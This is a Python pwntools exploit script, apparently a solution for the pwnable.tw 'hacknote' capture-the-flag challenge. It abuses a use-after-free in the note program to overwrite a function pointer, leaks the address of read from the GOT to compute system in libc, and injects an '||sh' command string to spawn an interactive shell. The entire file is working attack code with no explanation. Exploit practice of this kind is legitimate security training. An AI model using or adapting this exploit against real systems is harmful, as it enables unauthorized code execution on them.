from pwn import *

context.log_level='DEBUG'

'''
r=remote('chall.pwnable.tw',10102)
file=ELF('./hacknote')
libc=ELF('./libc_32.so.6')

r=process('./hacknote',env={"LD_PRELOAD":"./root/pwnable.tw/hacknote/libc_32.so.6"})
file=ELF('./hacknote')
libc=ELF('/root/pwnable.tw/hacknote/libc_32.so.6')
#libc=ELF('/lib/i386-linux-gnu/libc-2.28.so')
'''
r=remote('127.0.0.1',10001)
file=ELF('./hacknote')
libc=ELF('/root/pwnable.tw/hacknote/libc_32.so.6')

def add(len,content):
    r.sendlineafter('Your choice :','1')
    r.sendlineafter('Note size :',str(len))
    r.sendafter('Content :',content)

def delete(index):
    r.sendlineafter('Your choice :','2')
    r.sendlineafter('Index :',str(index))

def print_note(index):
    r.sendlineafter('Your choice :','3')
    r.sendlineafter('Index :',str(index))

add(16,'a'*16)    #note0
add(16,'a'*16)    #note1

delete(1)
delete(0)

read_got=file.got['read']
fun_addr=0x0804862B
add(8,p32(fun_addr)+p32(read_got))
print_note(1)
read_addr=int(u32(r.recv(4)))
success('read_addr'+hex(read_addr))
sys_addr=read_addr-libc.sym['read']+libc.sym['system']

delete(2)

#add(8,p32(sys_addr)+';sh;')
add(8,p32(sys_addr)+'||sh')
print_note(1)

r.interactive()